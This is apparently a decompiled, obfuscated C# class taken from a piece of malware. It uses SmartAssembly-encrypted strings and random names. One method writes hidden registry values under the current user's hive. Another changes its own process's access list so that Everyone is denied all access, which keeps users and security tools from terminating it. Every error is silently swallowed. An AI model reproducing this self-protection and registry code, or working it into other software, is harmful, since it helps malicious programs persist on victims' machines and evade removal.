using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace zvenNXaGjQywAfJS;

internal sealed class jUuEbMgtQaePX
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr RjqdPhzbeMQ, int cjhbavGczAvCG, [Out] byte[] qgfymXJztwKkIWrl, uint HxbIpPZffwnl, out uint qwKkGGoGMSiV);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr fnIWWJnbPGp, int DlbrQXBEYaZkl, [In] byte[] pjwUmhENjBZ);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void hOXwxuRwzcLLRuS(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(AFNAiOPxfKG.KfBmpaPpRy(getString_0(107409271)));
			registryKey.SetValue(AFNAiOPxfKG.KfBmpaPpRy(getString_0(107409166)), getString_0(107410383));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor hJaMYENfSGELgR(IntPtr intptr_0)
	{
		byte[] qgfymXJztwKkIWrl = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, qgfymXJztwKkIWrl, 0u, out var qwKkGGoGMSiV);
		if ((long)qwKkGGoGMSiV > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, qgfymXJztwKkIWrl = new byte[qwKkGGoGMSiV], qwKkGGoGMSiV, out qwKkGGoGMSiV))
		{
			return null;
		}
		return new RawSecurityDescriptor(qgfymXJztwKkIWrl, 0);
	}

	private void HMrEkXUvSJxqsx(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void vFZDkcLwhbcA()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = hJaMYENfSGELgR(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			HMrEkXUvSJxqsx(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static jUuEbMgtQaePX()
	{
		Strings.CreateGetStringDelegate(typeof(jUuEbMgtQaePX));
	}
}
